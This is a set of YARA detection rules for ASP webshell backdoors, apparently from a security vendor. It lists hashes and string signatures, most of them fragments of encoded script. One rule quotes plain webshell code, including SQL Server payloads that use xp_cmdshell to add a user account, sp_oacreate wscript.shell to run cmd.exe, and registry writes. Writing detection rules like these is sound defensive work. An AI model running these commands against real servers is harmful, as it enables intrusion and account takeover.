        hash1 = "749c28ef5ed2881ee54fb13f712edb43ed65481cd8be1cb51ffa2643f6b04c19"
        hash2 = "058aef0ea68af9c679f7f574194bd0e13ca6351d77b5706e20ed62c4d5b90380"
     strings:
        $s1 = "YPm[GZmYmVGo~x,?nD7nDcZ.nmY+68N+^YvEzf6oR;lYmVKLJ*@#@&mKxUjDDP{~JhDW7r[+M'tk^DGdK0ORxnYcrJ3GAR* Zi~fmOmPjKEMm+{J,'PU+.\\" fullword ascii
        $s2 = "1,'Pk+\"#2MR^IAbP3}4LA/YvrA:cX~Z#*@#@&/nP,l9r1)YmV6L,'PdnM.nIc/\"+CD2}ALAmDcJzf6(cZCOmVWTE#@#@&ZKUH/DI,'~JK.K\\rN" fullword ascii
        $s3 = "@!zm@*@!JY[@*@!zO.@*PJ@#@&BN4J@!O.@*@!Y9P4+rL4YxBy+B@*@!C~4D+WxEtOYalJzAShc,%O%O0FcmG:Jw.&Q?E(hkD'_u$+]A,3]9FY)w_'NKhlbxxEL" fullword ascii
        $s4 = "hW(LnmDJb@#@&w+XxJ1W:8k^Ws -mG:fk1Whc-^Ws*k^K:vk^K:{u1Gs%k1Ws,u^wDqu^wO -V2O2uVaOc-VwDXkVaY+uswO{-V2YRkVaY1E@#@&DU[a+a'k2^kOvw" fullword ascii
        $s5 = "mYrb~P,@#@&?nY~~,0~P,xP,0dGcM+OobVn`Mn$EnkYvJ;$0bs+r#bP@#@&~r6P0cCYDDk(;O+k'ZPOtnU@#@&~P6 lDY.r(EYnd{F@#@&,~" fullword ascii
        $s6 = "bP@#@&q6~\\k9`kY.kUS,kSP8bP{PEWrPr.~tk[`kOMkUBPb~P8#,xJwJ~K4+U~@#@&L,xP8*P@#@&3x9P&0~@#@&(6P\\k9c/DDrUBPkS~8#~',E" fullword ascii
        $s7 = "kkY.lOGM/SoMGEaJb@#@&sW.~Al^t,C9:r" fullword ascii
        $s8 = "~PbS~F*P{PEfE~:tnx,@#@&NPx~8&P@#@&Ax[P&W,@#@&&0,Hk9`kODbxSPb~~q*P',EmrPrM~\\k9`kY.kUS,kSP8bP{PE/rPK4n" fullword ascii
        $s9 = "Y+M@*Ebir@#@&L(JdnDKksnW!Y`rE[W1Es+UY C^V H|jm4EhC1t+. kE8:bOv#IrJBc!Z!*IJ@#@&%4r@!&d1DkaO@*r@#@&1Cd+,&@#@&d+O~1'j+M-+MR/." fullword ascii
        $s10 = "~PrS,FbP{~r+E,rMPHbNvdYMkU~,kS~8#P{~JAJP:4nx,@#@&L~'~qWP@#@&AUN,qW~@#@&qW~tk[`kOMkUBPb~P8#,xPrNEP}D~\\bN`kODbx~,rSP8#,'~J9E,K4+" fullword ascii
        $s11 = "0xELm\\lkmMrwD)oE^Vj5^?YMcJrJ[k}J/:ILJEJSELk'J*v@*r[('r@!zC@*Lx8/aIr@#@&,P,PP,P,3xGPrs@#@&~~,PP,U+XY@#@&~~P,P,P~P~j&'jqLE[" fullword ascii
        $s12 = "@*J@#@&N8J@!/OX^+~OHw+{EJD+6D&^/kJr@* /4GSVr/DONP4G.9+DR8KYOWsl[&f2PkWVbN,qwXiNJ@#@&%8r4W9z~DN" fullword ascii
        $s13 = "P^K1g?KM@#@&(0,+.D,Yung@#@&bWPAIDcH;H(2MPxPR+8c{ 8{%W&~GMP+]]c1i:~nMPx,OyFcFc+{ l,~K4+U@#@&q0,(1UYDvn.DcNA//Dr2DqG1B~JvZGU" fullword ascii
        $s14 = "/cE`ISrb@#@&xksC%4s'M+5E3jDRd2M#+\".).&bAs3k`ES}/zSmzfGIJ*@#@&)m:qG1{In}`2?DcJzmYbGUJ*@#@&IGWP2zKu'UnI7+] sbn2C:CcJcE*@#@&q" fullword ascii
        $s15 = "6O@#@&L4~dDDG4N@#@&2sk+@#@&L(Pr3DMW.\",ZCUEYP\"nl9\"J@#@&3x9P&0@#@&%8,J@!4M@*@!(D@*E@#@&nG.Db.Dmz{" fullword ascii
        $s16 = "E@*@!J2@*@!J0KDh@*E@#@&xr:m%4sPx~M+;;nkY 0K.s`Ek+Mkwr#@#@&EkD~',Dn5!+/D 0KD:vE[Ek+MJb@#@&2SN~',.+$EndDR0G.s`ENaA9Jb@#@&aWDDP{~D" fullword ascii
        $s17 = "HNBK9)BY?Ob@#@&~P,~,PoUYmDK,',(1kK]`y SOb1~rUls+'rEE~8#3v@#@&~~,P~P631GPx~&1/O.vsjKz]:~Ob1BJJrJBq#@#@&~P,P~~!nxzh+,'Pd/C?" fullword ascii
        $s18 = "~)@!&4@*@!8.@*@!t.@*r#@#@&:haPx,?aSqD`M3p`+dYc0G]s`JaGDDJ#BESJ*@#@&q2Px~kwJkDcIAp;3UKRW6\"HcJb2r#Sr~r#@#@&0K.P_j~',!~O}PE(6E" fullword ascii
        $s19 = "[N{kU/DDcdDlDBL+D/:kSE@!J?G@*E#@#@&T+O/D.'sk[cT+Ydhk~dYm.B+U9N /YmD *#@#@&nVk+@#@&T+YkOD{J" fullword ascii
        $s20 = "nCO4#@#@&G1,+I\"G]P\"+kj\\+~UA(O@#@&9ktP.dBPZ6Hg~~/:.AlhBP1Wxg?D.~,b9W1lO)dWo@#@&?AYPMj~',?AI#2] 1D3bD3r~9n/:`J)9}f$R\"n1W.9?" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _25e7dd4c7edbe53dd053ef0cd796ce020f551a76_c1611f9fe3537272f47b9cc1368c8ec164c07775_4
{
     meta:
        description = "asp - from files 25e7dd4c7edbe53dd053ef0cd796ce020f551a76.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5c28e493efd2b65ac03c111f6369330146410a1c0e151fc7be3c1f18805f0915"
        hash2 = "bf91ab2d6d4b25a46bfbed95191aab54aa9d31708c0e0f41c3c96c83bc015ed5"
     strings:
        $s1 = "D/@#@&P,?+D~G4Ns6'G4%o9Rok^n/@#@&~~9k:~dDDoNgCs+@#@&P,rx,2M.WMP]+kEhn,1+XO@#@&PPwG.PAl1t~rUnGk.P&UPK4%ok@#@&~~,PdYMo91Cs+{rx" fullword ascii
        $s2 = "arzamO@*E/.nDVkwzYbDE1nj+^4mx3-2ramP-knmb\\.nU- TTD+jVK.DxG;-t2KU5Uw2gquZzHmJzZrdm5A|CExnE^l7PUWrOaW@!" fullword ascii
        $s3 = "#@~^xXIBAA==/KxdDPG209'rE@#@&/;4,?4GS2DMc#@#@&P,(WPADMPPtnU@#@&%J@!8D@*@!C~4D+WxELC\\md1DraY=tkkYK.Xc4Cm0`bv@*@!4M@*PrP[,3.Dcf" fullword ascii
        $s4 = "JW,[PER\"lOkKd;Dn9kD'!rPL~\\(Z.S6P'~rOp!GYmZEM.nxD'ZJ~[~-(Z.S6~[,JR}!WYC\\m6r:!h{!E,[,\\4;DdWPLPm@#@&P~~,PP,~J HlbUO+" fullword ascii
        $s5 = "OPK4%o6'1GO4kUo@#@&,2U9PwEx1YbGx@#@&~nMk-CD+Pw;x1YkKU~ZM+mYnnCOD+.xvV+HhG.9#P~~@#@&~P,/M+CD+hlYD+MU'0+zhKD[@#@&PP,/D" fullword ascii
        $s6 = "@#@&,P,~KHwnSb/O~{PPr lkwRmdCR(lDR8:2 1WhR9GmcN8 9VV nX+ obWctOsR4Y:^RbUmckUkcL2LcL/csWTR:98 :bNc:2& 2" fullword ascii
        $s7 = "VkwqhKt?{UGkDmzgv'^.kPv+sCDw+srwB'nhmx~+sCM0r@!@*9Y@!@*By* W *a=NU;KDo0^l(B'" fullword ascii
        $s8 = "B@*fnV@!&m@*~@!m~tM+WxELl-Ckm.kaO=s;^VwWDs`rEJLInnmY4chlY4'J'J[d Hls+*[EJESrJ/WazsbVnEr#B~^^ld/{vm:v,YbYV" fullword ascii
        $s9 = "`JoG^NnDhCDtE*[r-/4+^sRm/2J=KaO{/YM$bG@#@&AU[P&0@#@&%PE@!wW.:,CmDkGU{BJ'i\"S'JQ)1YrKxy'nK/DvPs+OtKNxvaW/DvP" fullword ascii
        $s10 = "'VmbV^UKPl@!@*BXw =LUk9Nmwv'nsHYdP8xtDNrA,NY@!@*9Y&@!@*vZ!TZ!Za)9x!GDT3^l(Bxn^XYk~F{tY9rAP9Y@!@*[Y&@!@*+hlMWkJ@!@*vZB'.n9DG4" fullword ascii
        $s11 = "v@*}wnx@!zC@*,J@#@&dk{/kLE@!l,tM+W'v%m\\C/1.kaYlo!VVoGM:cJrELInhlDt`hlD4[r-E[dRHCs+#LEJr~Jr3[kDsbVnJEbEP^Vmd/{BChEPYrO^+xB" fullword ascii
        $s12 = "x~@#@&~NPxP8*P@#@&3U9PqW~@#@&(0,\\bNckYMkxBPbSP8#~',J[E,rD,\\k9`/D.rxBPb~~Fb~{PEfr~K4+U~@#@&P%~{Pq&,@#@&2U9P&0P@#@&&WPtk[`kY.r" fullword ascii
        $s13 = "O~VKmmVLDG;aPCNsrxb/O.mYW.d,l[:bUfP&mN9BPkk.n'E*TB@*@!&O9@*J@#@&LrP@!JO.@*r@#@&LEP@!OMPCVbLx{B^n" fullword ascii
        $s14 = "WYv0S+*@#@&nU9Pr0@#@&6Y2aWMYP{P+X*Z!@#@&DkhnKEY{f@#@&VWTrUEk+MPxPEik+.Pr~[,EdnMP[~-(Z.S6@#@&VGTk" fullword ascii
        $s15 = "/DcJUjCmDkGUr#@#@&r0,PxKO~kkx!:nDr^v?il1OkKxb~Dt+U~M+dwKUk+ " fullword ascii
        $s16 = "?DlDDP{9qAx[@#@&KoJcsk^n?by+,x~fUYmDOPR9&2UN,R&@#@&rW,xWO~G  2XrkYdvja1ls+*~Y4+U@#@&P~9yRl9[P`w1mhn~:sd@#@&+U[,kW@#@&~P" fullword ascii
        $s17 = "[sswoosEPmVroUx^+WY@*E[}4Pcb~ b'r@!&Y9@*@!zOM@*r@#@&g+XO@#@&L~?&@#@&3MDR;s+mD@#@&@#@&0!x1YrWU~T+OC:PnhlLnvEDsb,@#@&W" fullword ascii
        $s18 = "N;WsW.xEaq 8+FyBEE@*J@#@&db'dkLobVn&mK`Sc1mh+*@#@&/b'drLJ@!m~tM+0{v%l7lkm.k2O=s;V^oWM:cErJ[]nhlOtvKmY4LJ'J[dRgC:" fullword ascii
        $s19 = "D,xP2!lP;kWU!:P{~Fl@#@&wG.PbP{PqPPG,x;:(nD,?OnaP ~@#@&w^/D.{`c4+XN+1`trNvNCYm~rSy##,aWMPt" fullword ascii
        $s20 = "@*[{Nk~[D@!@*BMnDxn1B{xobVm~DD@!@*DDz@!@*9Yz@!@*BMWYm.O/bxb:[bsC1WJB{nE^l-~ED+d;9BxNb~E6G~YX+KE'kdl^m~BD6nOE'+azY,BD" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _2f2f5857f76a096b6bb38c6d8cdc567b9e8ab6d2_86b73fb74aa7ab1660bb7ce5f27099b44d29386b_be48b04c147d3286bd69d275931b3e9c0e30d5f6_5
{
     meta:
        description = "asp - from files 2f2f5857f76a096b6bb38c6d8cdc567b9e8ab6d2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c45d67615643b285ec4e1fb5f5195b7d3f5ca8c9bf41d328dca7396641bfc6d7"
        hash2 = "d1f80e42556d4ec83f707870783af2f284d798e531007dfe338c9967b4943e02"
        hash3 = "48168e91f1e9b3a66c11ec7a5db147d13ac657146e3d78b125fd71771e1795a8"
     strings:
        $s1 = "vY;l,&Om]!*F+0m]!*W!9{Y;F,o!u+ u +YyZsHCs+Y OY2AOKwctk9+6GDsRo1m:n 7lV!n]y!_uf9]y!u +]++uG/]F/]FZY{;] +Yy QfgCs+Y2AuGf" fullword ascii
        $s2 = "RZF~ 2FP *2P c2~c%f,RlFF,RlqF,R{,,R+q8PRWqF,RFZq~RlF8P Gqq,R0&, c2P q+PR+q8P %2~ccf,RR&PcG8qPc%fPccf~cFv, G8FPcf" fullword ascii
        $s3 = "[E@!&WKxO@*@!&0KxO@*@!zmnUD+.@*@!4MP^KVKD'[cy* W ~/bynx8P@*rlI\"?J@!&ON@*@!JY.@*El&0~r(P`Z~qb{JP" fullword ascii
        $s4 = "X{JPLP78mMVW@#@&VnC7+/,xP^+l7ndPLPrOj2PiU2]?APjhJ~',\\4^.^0~[,E qK{!c!RZRZEPLP-41DsW,[PrRnKDYgGxJ,[,Y2W.O,[~\\(^D^0~',JOid" fullword ascii
        $s5 = "~f(HCxmon.v#@#@&~PU;VUO.':Db:cIn5!+dYcoWM:cEU;VjOMJb#@#@&,P9(?DD'\"+$;+kY sKDhcrf4UODr#@#@&~~?&'Uq'J@!Om4s+,Ak9Y4xEv*Tv,P8WM[" fullword ascii
        $s6 = "[O2@#@&KyRKGkkYbGx,'PZ~lP: cKzwn~{P+@#@&P cZ4CM/+O~{JL4yf8 E@#@&Us.,',P cInl9KnaD@#@&:+R;VWkn@#@&b0,fqR3ab/O/viwglhn*PY4n" fullword ascii
        $s7 = "zMz6rP9xn&Cz-Mw0Wwe'x*-M'+9WHTE(nf&-M-vxGrk/+kl#4YlhOT!\"`,NU+jss(&eJU+4Y~wC-3GwC-~@*@!~*-M'+9WHTE(nf&-M-vxGrk/+k~0bzeJwM-@*D" fullword ascii
        $s8 = "6D/tmD/W9+bb,@#@&bqP{Pk8~QP8P@#@&3x[~&0~@#@&H+XY~@#@&4XOnk $?:],'~kYMI+DEMUP@#@&~P,P3.MRZ^nlM@#@&AU[PwE" fullword ascii
        $s9 = "*R{|];W2wv]!G+0c|];*8v0muE*WTf|]EF1o!u y]+ Y+;sHlsn]y,Yf~YW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s10 = ".KlDtr#xI]nhlOtvoW^Nn.hlY4b=2UN,(6)(6PU+/kkKU`rsGV9+.KmYtrb'rJP:4nx=sKV[+.KmY4'\"GWDnCO4)?ndkkGxvEwWs9+MnlDtrb'wWsN" fullword ascii
        $s11 = "FName=Request(\"FName\")#@~^F24BAA==@#@&@#@&~l13jMV{E@!(D@*@!(D@*@!1+xDnD@*@!l,4.+6'ELC\\Cd1DrwDltb/OGMXR8C13c#E@*" fullword ascii
        $s12 = "v@*fnV@!&l@*J@#@&Uq'j(LJ~@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[\"nKlDtvnCY4'r-E[w 1m:nbLJJESrJ\\W7nwWs9+MJJ*BKUm^k^3{B.nDED" fullword ascii
        $s13 = "'ZJPLP78mMVWPLPER\"lYbGja'Fr~'P741Ds0~',{@#@&rRImYrGGWhUx8J~[,-(m.^0,[PrO\"CYbWdZM+[rD'!r~[,\\41.s0,[,JRp;GDl/EM.+" fullword ascii
        $s14 = "hPz.DmX`8+biUYM$TT~x,JEnMG\\bNn.{Hk^.K/G0D x+Ocrd2f~RW !pfCYmPjG!Dm" fullword ascii
        $s15 = "br@#@&j({?([r@!JY[@*@!JYD@*J@#@&?&!xJ@!Y.@*@!YN,4+botDxEJy!rJ~4L^KVGD{EJ[soowssEE,mGVk2mxxrJyJJ@*P@!&Y9@*@!zDD@*E,@#@&" fullword ascii
        $s16 = "`/*@#@&~Pb0~xKY~rkxE^s`k#PD4nx@#@&,P~Pd~{P.+asl1+cdBPJ@*EBPE@*rb@#@&~,P,/P{PMnw^l^+v/S~r@!JB~J@!J#@#@&~P,PkPxP.naVCm" fullword ascii
        $s17 = "XuE%108];*20~];Fsy,]!G+0ctN8]!vX0F]EW3s+{]!XqvR{uEXcT9|];GOo!u /Y!vZ30uE" fullword ascii
        $s18 = "@!l@*[U4d2p[U4k2iLx8dai[U8kwI@!m~4Dn6'ELl7lk^DbwO)UtGAwWV9nDvJJ;lw-hDKo.lh~wks+kw-\"trUK?WWOcmG:rE*B@*v&*" fullword ascii
        $s19 = "L{BTE@*r)I\"?r@!YM@*@!Y9P4nbotDxBlB@*@!&ON@*@!JY.@*El\"IjJ@!OD@*@!O[@*@!mnUD+.@*@!WKxO,mKVWM'arx0@*@!0KxO~kky" fullword ascii
        $s20 = "8!o]!*2ZfY;R!s9Y!**!;Y!**ZfuEsw!8Y y]+ u /ogl:" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _73d1d98465e4119ddd41512b3be7afca04c105b5_adf4e9dea7276a202cbc99d23f99c1f4095b95d3_6
{
     meta:
        description = "asp - from files 73d1d98465e4119ddd41512b3be7afca04c105b5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
        hash2 = "a2f59afbb8ec963f945c8945ae37f6302059f94f7688745a22b17c7193414ab0"
     strings:
        $s1 = "Webshell Mumaasp.com" fullword ascii
        $s2 = "xOZKP=nMlN_nN9RbknGxkw\"+n=0=wOiK,=P{+O.ktl /k+Gxk2\"+|m:M+/DY O+KmUzbWCObmw^Cw,UP{2nKHxDYnWU ;/nW" fullword ascii
        $s3 = "+.)UaYg+blK/PK~ vq%2+OPc,[K/_h#*~Fb~SPDDOdT+Nv\\k1`bk'~D,?D+APU~{Y.hUU+*)O.D/onUvSnW,~:Pq,',kWM)wODS?U+BP~rb:)Gd#hW~,O.Yko" fullword ascii
        $s4 = "BPDXan'EtrN9+Uv,kN{v?`lmDrGxEP7lsEnxE v@*@!&0KDh@*r@#@&]]UJ@!/1.bwO,Vmxo!lTn'ELC\\m/^.bwYE@*J@#@&I\"jENKm!:nxO SDrY" fullword ascii
        $s5 = ";EG8?DDU*|rxT'EV2l[[EP^+^Uo{BTdalmr~1+sVMxE!v(WMN+EvlTBbNOt{4sn,h[?@!Ym?q{j(!E@*?=GxxvEPCmDrwK/Ov4WNxvEPh+D8wW.s:" fullword ascii
        $s6 = "B,\\CV;n{BfB@*@!z6W.h@*J@#@&]\"?E@!k^Mk2DP^lxTEmL+{B%l7ld^MkwDv@*r@#@&\"]jJ9W1Eh+UOch.kDn`E@!8.@*@!mnUD+.@*" fullword ascii
        $s7 = "DPr'0!/+M'EP,wm/dPE'6wC/k'J,lO~aWDO~r[~0aGMY~LJ,tl7+,[+^+O+9@!&[b\\@*r@#@&i+Vkn@#@&idM+dwGUk+ hMrY" fullword ascii
        $s8 = "UserPass=\"mumaasp.com\"'" fullword ascii
        $s9 = "P|lO'hU~+{.mKE~jDlfCTpc Ac3GrJDRx+YcW6G/1D\\kM'[n7kDKSnLUY4KCUL+{D^W;~UYCfmTiWR$ AfrJOc9nYcG6Wd1DtkD{N" fullword ascii
        $s10 = "4jqxj&@*==AUN,qW|m4Vn@*M@*@!zD[@*@!&DB@*@!zDsAo2wDxB[2~^KVWL=@!4D?&xjq?={1GY4nDP]/Kd+=?]dcZVrUT=()U({I]UPUUU#2^d+,=s?DDbO" fullword ascii
        $s11 = "=nD^NoG4+PD~[DD`kn.V9sKYn+C^M#|q6[PAx|dv2WnOc?C:MnkYb#U*xYD+KU+;ksU6/c~MY+MrRql:MndY#Py#St=CD+KY4cUM/'~MP/On,ksWwn:l-c?m:D" fullword ascii
        $s12 = "kxv8!!Ar9Y4@*@!O9P'?@!DD?&'U(Y9@*==JY[@*?UU?@*@!(?YM'=U?[GlsEnxF!vP7[Y4)*n{Bhr~kYzV(jDDvs+{Bf!Y,Ul@*@!rxa[=@!DN?&x?&=wDrGx" fullword ascii
        $s13 = "+9?+1EMn'ZJ~[,\\8^MV0,'PrOCb[nCbN9+U'TE,[~\\(^D^0~',JO)sSlz/zs^WAdWTkx{!r~[,\\8mMVW~LPJ /tmxo" fullword ascii
        $s14 = "(f:C=PqwaI,A6IG3I A6P:rHR/}S6I=~[!TR!Z!i,Z}Jr\")~aZ!WWZ!i,$r\"f2\"RPrhO;rJr]l,aT!RT!Zi~o}1KRozH(SIl,\\nMNmxlpP~6IG2]O\"q!u:O" fullword ascii
        $s15 = ":w'wEJ*B@*Kn:2@!Jl@*:Q@!l,t.n6'B%C7ldmMraYlUtKhsKV9nDvJEZ=-w]AZ5;J2\"--rEbB@*IAZeZJ3\"@!&l@*-~@!l~4M+0xvNl-lk^Mk2D)UtWSsKsN" fullword ascii
        $s16 = "Pd.1'YndDRC/aa,hr9Y4',l!,4+bo4Y{&TT@*@!zbWDm:+@*~E)\"+kwGxdnch.kDnPr@!8.@*@!4.@*@!w@*@!(.@*@!2@*@!(D@*@!4M@*@!a@*@!4M@*@!^" fullword ascii
        $s17 = "D-n#UPD4+DU#{=cUaWMRoW.h$En/Dr0,DnU#%,S*2&f~2fW*S8c8&,BcBq&l~T~8FTSy*~R+FB &bdO'?nKDOS1XRU|+^d+#:c=aWY oKDn;!nkkdD'MnWMYd.Y?#|+" fullword ascii
        $s18 = ";;+kORwW.hvJ02Ck/E#@#@&6wGMY,'PM+$;+kY sKDhcr0wK.Yr#@#@&W2lDt,'~Dn5!+dYcoWM:cE6wlO4r#@#@&a.b\\r^+T+'M+$;+kY sKDhcrwDb-k^+o" fullword ascii
        $s19 = "B@*!@!zWWUO@*@!8D@*E[wRHCs+[E@!Jl@*J,@#@&?({?&[J@!4M@*@!(@*,@!J4@*@!mPtMn0{BLm-C/1DbwO)o;^VoWMh`rJE'\"+nCO4`KlD4LJwr[wR1m:" fullword ascii
        $s20 = "6D@#@&U+D~6hWdY,'~/M+lDnr(L+1OcJt?oHJ  ptSuK:KJ*@#@&ahW/O }wnx,Ehrj:JBPJ4YD2)Jzq FRT ZRF=E[,wWMO~[rz^+C\\ndr~~KM;+@#@&aKK/Y j" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _45cdac89a10152fdc1c19b6d9871d8a253c567c8_f3398832f697e3db91c3da71a8e775ebf66c7e73_7
{
     meta:
        description = "asp - from files 45cdac89a10152fdc1c19b6d9871d8a253c567c8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "251587a4e8fe29c43ea4811c521c1a471a1bf33eed03a81ade5d07e46c32f5c9"
        hash2 = "25dcb3c200f51d3f39f2859d71516ec0b1a3a4c2b93c9ea0bc4ce9d5894a2f0e"
     strings:
        $x1 = "sResult = oWshl.Exec(\"cmd.exe /c del \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x2 = "sResult = oWshl.Exec(\"cmd.exe /c type \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, P Text, fileContent Image)\")" fullword ascii
        $x4 = "\"<option value=\"\"Exec master.dbo.XP_CMDShell 'net user lcx lcx /add'\"\">XP_CMDShell" fullword ascii
        $x5 = "@o out exec sp_oamethod @o,'run',NULL,'cmd /c net user > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);\"" ascii
        $x6 = "(2)<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell" ascii
        $x7 = "sCmd = \"RegEdit.exe /e \"\"\" & rootPath & \"\\ReadRegX\"\" \"\"\" & thePath & \"\"\"\"" fullword ascii
        $s8 = "<option value=\"\" EXEC [master].[dbo].[xp_makecab] 'c:\\test.cab','default',1,'d:\\cmd.asp'\"\">" fullword ascii
        $s9 = "Response.AddHeader \"Content-Disposition\", \"Attachment; Filename=\" & Mid(sUrlB, InStrRev(sUrlB, \"/\") + 1)" fullword ascii
        $s10 = "Response.Write(\"oShl.ShellExecute \" & appName & \", \" & appArgs & \", \" & appPath & \", \"\"\"\", 0\")" fullword ascii
        $s11 = "cmdStr = \"c:\\progra~1\\WinRAR\\Rar.exe a \"\"\" & cmdStr & \"\\Packet.rar\"\" \"\"\" & cmdStr & \"\"\"\"" fullword ascii
        $s12 = "\"<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\M" ascii
        $s13 = "document.write(\"<a href=\\\"javascript:Command('Query','\" + i + \"');\\\">\");" fullword ascii
        $s14 = "<option value=\"\"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c" ascii
        $s15 = "document.write(\"<a href=\\\"javascript:Command('Query','1');\\\"><font face=\\\"Webdings\\\">9</font></a>\");" fullword ascii
        $s16 = "Set rs = conn.Execute(sql, i, &H0001)" fullword ascii
        $s17 = "If appName = \"\" Then appName = \"cmd.exe\"" fullword ascii
        $s18 = "doWsCmdRun = oWshl.Exec(cmdStr).StdOut.ReadAll()" fullword ascii
        $s19 = "Set rs = conn.Execute(sql)" fullword ascii
        $s20 = ":</td><td>&nbsp;\" & cbool(User.Get(\"PasswordExpired\")) & \"</td></tr>\"" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1937efedfec46cfd0e25df94151d977e117c0582_e67bc9bbbcd57796d78c80daa1cb15ade4f35fbf_8
{
     meta:
        description = "asp - from files 1937efedfec46cfd0e25df94151d977e117c0582.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8dcbb18e02d5be2663448810946eae9f1618afebe35d779699afc9ece1bc1fcc"
        hash2 = "4b42079f09f2a2c67519084e18b9e12a3c32cd1f60aaa65cdbfbb18e6835e367"
     strings:
        $s1 = "/OvJhDWwk^nJ*[EZKxEb{l/4Ghbm@#@&nUN,k6@#@&L~)awsk1CYbWUcM+;;nkYcJh.Ksr^+r#[rZKUJ*@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!mnxOnM@*" fullword ascii
        $s2 = "Y~6l1+'EhbUo9kUokB~^KVWMxB[&&6WT!EPkk\"+xv2B@* @!&0KxO@*,J@#@&~,2UN,(6@#@&Ax9Ps!x1OkKx@#@&wEU^DkW" fullword ascii
        $s3 = "s@!Jl@*P@!l~4M+0{vLm\\lk^.kaY=s;VsoKDh`rEJLInKmYtcKmY4[rwr[Jc1m:+*[rEJBJEZKwzobV+rE#EPm^Cd/{Bm:vPOrDVn'E" fullword ascii
        $s4 = "/ORUnD7+.#mDkC8^+d`rjAI#AI|?rwKq)IAJb[r@!&O9@*@!JOD@*J@#@&oGD,k{!~KG~8%@#@&U('Uq'E@!YD~C^kLx{v1+UD+MB@*@!Y9~t" fullword ascii
        $s5 = "PxPZ@#@&,Por^+?OCMYxPZ@#@&P~Ax9P?!4@#@&P,n;4^k^~6Ex1OkKxPUC-+z/vsb@#@&~,Nr:,P&@#@&~~Ul\\n)k'OD!n@#@&~,k6PYMkscs*'EJ,W.~wkV" fullword ascii
        $s6 = "[`kY.b@#@&In[,'~J@!o}1P,mKVWM'[W0y + @*J~',/YM~[,J@!Jo61:@*r@#@&2U[,s;x1OkKx@#@&@#@&s;U1YrW" fullword ascii
        $s7 = "R(Cm0o.W!x[/KVWMxB[!!+fT!EJrPGx\\G!/nr!O'rJO4b/RdOHVnR(C13LMW!xN;W^GD{B:!Z&TTZBJr@*J@#@&/bxdkLsbVnq^GvS 1mh+*@#@&db'/r'r@!CP4." fullword ascii
        $s8 = "`nmY4b@#@&nCY4'j2^kYvKlDt~rkku-J*@#@&qW~;s sbs+A6rdD/`KCDtc!*b,lU9PhlY4`8b@!@*JEP:tnU@#@&Zw ZKwXwrs+,nmY4`TbBnCY4cF*@#@&j&'J@!^" fullword ascii
        $s9 = "o/rSJhDWT.C:,sbVn/ESrqU+D2E(JSE6YwESrhhw!8r~ED0DwJ*@#@&oWMPrP{PT~DWP`8W!xNvPn:asKV[+.Jb/O#@#@&q6Poj}RsGs9+.2XrkYdvfMk\\" fullword ascii
        $s10 = "@!&C@*r@#@&fr:~39kOr}F@#@&2[rDrrFx8@#@&29rDr6j'^RbDYMr4!Yn/@#@&(W,2NbOr}.P@*x~Fy%,K4+U@#@&2[kD6rjPx~ANkO6}.~O,qy%@#@&2" fullword ascii
        $s11 = "YPK8%s9'K4%sdGcMnYwGV9+.cwWV[nM#@#@&,~U+O,W(Lsk'K8LwN ?!4oG^N+Md@#@&PPUnOPK4NsW'G8Ns[RwrV" fullword ascii
        $s12 = "@!&wrIt@*@!Gq.@*E@#@&U+DPo?6xgWOtbUo@#@&3U9P?;8,@#@&?!8,?^mxGDk7+v9Db\\n#@#@&9rsPsU6~:+/D9.k7+BAC/noKV[+MSK" fullword ascii
        $s13 = ".J@#@&ZmssPANbYKWAnM`.+$;+kYcEhWhn.hlOtrb*@#@&;lk+Pr?m-+hWA+MJ@#@&;lV^~?m\\+hGA+M`M+5EndD`EnKA+MnCO4J#S." fullword ascii
        $s14 = "U9Pr6@#@&PPAx9~?!4@#@&Ax[~;Vlkd@#@&@#@&;sC/kPwqo@#@&[b:~sbs+Uk\"nBsksnUYCDD@#@&P~hDb\\lD+,jE(P/Vm/dm&xkDrl^ky" fullword ascii
        $s15 = "w^l^+c\\bNcsbs+glhnBqxdOMIn\\vobVngls+~r-rb_8#SJ@!0GUDPmKsWM'BE@*yF@!z6WUY@*E*@#@&P,~P,r;OhEYxE@!YC4^n,lsbo" fullword ascii
        $s16 = "@*@!&KG@*@!&wrI\\@*@!zPI@*@!:I~1Vm//{K~Pf@*@!or\"H~C1YkKU'QbmDrGx{?1sGV[nM[oW^[+M'E@#@&LPoj}R!+Dja+^bl^sW^N" fullword ascii
